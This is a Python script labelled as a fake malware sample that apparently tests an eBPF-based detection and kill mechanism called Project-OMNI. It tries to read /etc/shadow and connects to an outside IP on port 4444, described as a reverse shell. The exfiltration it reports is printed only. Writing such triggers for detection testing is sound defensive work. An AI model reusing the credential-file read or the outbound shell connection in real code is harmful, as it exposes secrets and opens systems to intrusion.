#!/usr/bin/env python3
import socket
import time
import sys
import os

print("[*] OMNI Fake Malware Sample Initializing...")
time.sleep(1)

# 1. Suspicious File Access
print("[*] Attempting to read protected secrets...")
try:
    with open("/etc/shadow", "r") as f:
        print("[+] Successfully accessed /etc/shadow")
except Exception as e:
    print(f"[-] Failed to read /etc/shadow (expected, but syscall logged): {e}")

time.sleep(1)

# 2. Suspicious Network Connection (Simulated Reverse Shell)
print("[*] Initiating outbound reverse shell connection to 185.123.45.67:4444...")
try:
    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    # Set a small timeout so it doesn't hang indefinitely if the IP drops packets
    s.settimeout(2.0)
    # This syscall will trigger the eBPF __arm64_sys_connect hook
    s.connect(("185.123.45.67", 4444))
    print("[+] Connection established! Spawning shell...")
except Exception as e:
    print(f"[-] Connection refused or timed out (expected, but syscall logged): {e}")

# If we survive the Ring-0 kill (we shouldn't!), we loop.
print("[!] WARNING: Survived Ring-0 kill! Project-OMNI mitigation failed.")
for i in range(10):
    print(f"[!] Exfiltrating data chunk {i}...")
    time.sleep(2)

print("[*] Malware execution completed.")
